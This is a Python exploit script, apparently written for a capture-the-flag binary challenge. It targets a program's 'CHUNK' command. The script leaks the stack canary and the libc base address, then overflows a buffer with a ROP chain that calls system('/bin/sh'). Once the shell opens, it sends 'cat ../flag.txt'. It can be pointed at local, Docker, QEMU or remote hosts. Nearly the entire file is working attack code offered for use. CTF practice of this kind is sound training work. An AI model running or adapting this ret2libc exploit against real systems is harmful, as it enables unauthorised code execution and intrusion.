#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    binary=ELF('./chall_patched', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set follow-fork-mode parent
b *0x4013D6
b *0x401266
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal = ['tmux', 'splitw', '-h', '-l', '175', '-P', "-d"]) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=True)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

sl(b'CHUNKS 3')

# debug()
sleep(.5)
s(b'CHUNK 1 100 ' + b'A'*0x49)

ru(b'A'*0x49)
canary = u64(b'\0' + rb(7))
libc.address = u64(rb(6).ljust(0x8, b'\0')) + 0x4090
slog('canary @ %#x', canary)
slog('libc base @ %#x', libc.address)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

s(b'CHUNK 2 1 ' + b'B'*0x48 + p64(canary) + p64(0) + \
  flat(
      pop_rdi, next(libc.search(b'/bin/sh\0')),
      ret,
      libc.sym.system
))

sl(b'cat ../flag.txt')

sleep(1)
sl(b'cat ../flag.txt')

sleep(1)
sl(b'cat ../flag.txt')

sleep(1)
sl(b'cat ../flag.txt')

interactive(flag=False)
